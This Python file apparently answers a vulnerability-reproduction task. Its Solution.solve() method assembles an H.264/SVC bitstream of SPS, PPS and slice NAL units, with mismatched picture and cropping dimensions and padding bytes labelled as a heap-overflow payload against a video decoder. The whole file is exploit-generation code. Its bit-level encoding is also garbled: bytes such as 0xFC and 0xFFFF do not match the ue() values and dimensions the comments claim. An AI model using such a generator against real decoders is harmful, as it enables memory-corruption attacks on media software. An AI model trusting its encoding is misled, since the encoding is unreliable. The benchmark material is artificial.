import os
import struct
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal SVC bitstream that triggers the vulnerability
        # Based on the description: mismatch between decoder display dimensions 
        # and subset sequence dimensions causing heap buffer overflow
        
        # Basic SVC NAL unit structure
        def create_nal_unit(nal_type, rbsp):
            # Add emulation prevention bytes
            rbsp_processed = bytearray()
            count = 0
            for b in rbsp:
                if count == 2 and b <= 3:
                    rbsp_processed.append(3)  # Emulation prevention byte
                    count = 0
                rbsp_processed.append(b)
                if b == 0:
                    count += 1
                else:
                    count = 0
            
            nal_unit = bytearray([0x00, 0x00, 0x00, 0x01])  # Start code
            nal_header = (0x60 | nal_type)  # F=0, NRI=11, Type=nal_type
            nal_unit.append(nal_header)
            nal_unit.extend(rbsp_processed)
            return bytes(nal_unit)
        
        # Create sequence parameter set (SPS) with mismatch in dimensions
        # This will cause the heap buffer overflow when display dimensions
        # don't match subset sequence dimensions
        
        # Create SPS RBSP
        sps_rbsp = bytearray()
        
        # Profile and level
        sps_rbsp.append(66)  # Baseline profile
        sps_rbsp.append(0)   # Constraint flags
        sps_rbsp.append(30)  # Level 3.0
        sps_rbsp.append(0xFC)  # seq_parameter_set_id = 0
        
        # Log2_max_frame_num_minus4
        sps_rbsp.append(0xFC)  # ue(0) = 0
        
        # pic_order_cnt_type
        sps_rbsp.append(0xFC)  # ue(0) = 0
        
        # Log2_max_pic_order_cnt_lsb_minus4
        sps_rbsp.append(0xFC)  # ue(0) = 0
        
        # num_ref_frames
        sps_rbsp.append(0xFC)  # ue(0) = 0
        
        # gaps_in_frame_num_value_allowed_flag
        sps_rbsp.append(0x80)  # 1 bit: 1
        
        # pic_width_in_mbs_minus1 - set to large value to trigger overflow
        # This creates a width of 6000/16 = 375 MBs, which is 6000 pixels
        sps_rbsp.extend(b'\xFF\xFF')  # ue(374) - large value
        
        # pic_height_in_map_units_minus1 - set to mismatch with display
        sps_rbsp.extend(b'\x00')  # ue(0) - height of 16 pixels
        
        # frame_mbs_only_flag
        sps_rbsp.append(0x80)  # 1 bit: 1
        
        # direct_8x8_inference_flag
        sps_rbsp.append(0x80)  # 1 bit: 1
        
        # frame_cropping_flag - set to 1 to enable display dimensions
        sps_rbsp.append(0x80)  # 1 bit: 1
        
        # frame_crop_left_offset, frame_crop_right_offset
        # frame_crop_top_offset, frame_crop_bottom_offset
        # Set display dimensions that don't match sequence dimensions
        sps_rbsp.extend(b'\x00\x00')  # ue(0), ue(0) - left, right
        sps_rbsp.extend(b'\x00\xFF')  # ue(0), ue(255) - top, bottom
        # This creates display height of 16 - (0+255)*2 = -494 (underflow/wrap)
        
        # vui_parameters_present_flag
        sps_rbsp.append(0x00)  # 0: no VUI
        
        # rbsp_trailing_bits
        sps_rbsp.append(0x80)  # Stop bit
        
        # Create picture parameter set (PPS)
        pps_rbsp = bytearray()
        pps_rbsp.append(0xFC)  # pic_parameter_set_id = 0 (ue(0))
        pps_rbsp.append(0xFC)  # seq_parameter_set_id = 0 (ue(0))
        pps_rbsp.append(0x80)  # entropy_coding_mode_flag = 1
        pps_rbsp.append(0x00)  # pic_order_present_flag = 0
        pps_rbsp.append(0xFC)  # num_slice_groups_minus1 = 0 (ue(0))
        pps_rbsp.append(0x80)  # rbsp_trailing_bits
        
        # Create slice header
        slice_rbsp = bytearray()
        slice_rbsp.append(0xFC)  # first_mb_in_slice = 0 (ue(0))
        slice_rbsp.append(0xFC)  # slice_type = 0 (P slice) (ue(0))
        slice_rbsp.append(0xFC)  # pic_parameter_set_id = 0 (ue(0))
        slice_rbsp.append(0x00)  # frame_num (4 bits for log2_max_frame_num=4)
        
        # idr_pic_id
        slice_rbsp.append(0xFC)  # ue(0)
        
        # pic_order_cnt_lsb
        slice_rbsp.append(0x00)
        
        # dec_ref_pic_marking
        slice_rbsp.append(0x80)  # Stop bit for ref marking
        
        # rbsp_trailing_bits
        slice_rbsp.append(0x80)
        
        # Assemble the bitstream
        poc = bytearray()
        
        # Add NAL units
        poc.extend(create_nal_unit(7, sps_rbsp))  # SPS
        poc.extend(create_nal_unit(8, pps_rbsp))  # PPS
        poc.extend(create_nal_unit(1, slice_rbsp))  # Slice
        
        # Add filler data to reach target size and ensure overflow
        # The exact size needed to trigger the overflow is important
        remaining = 6180 - len(poc)
        if remaining > 0:
            # Add carefully crafted payload that will overflow the heap buffer
            # when the decoder tries to copy display data
            overflow_payload = b'\x00' * (remaining // 2)
            # Add pattern that will cause writes beyond allocated buffer
            overflow_payload += b'\xFF' * (remaining - len(overflow_payload))
            poc.extend(overflow_payload)
        
        return bytes(poc[:6180])  # Ensure exact length
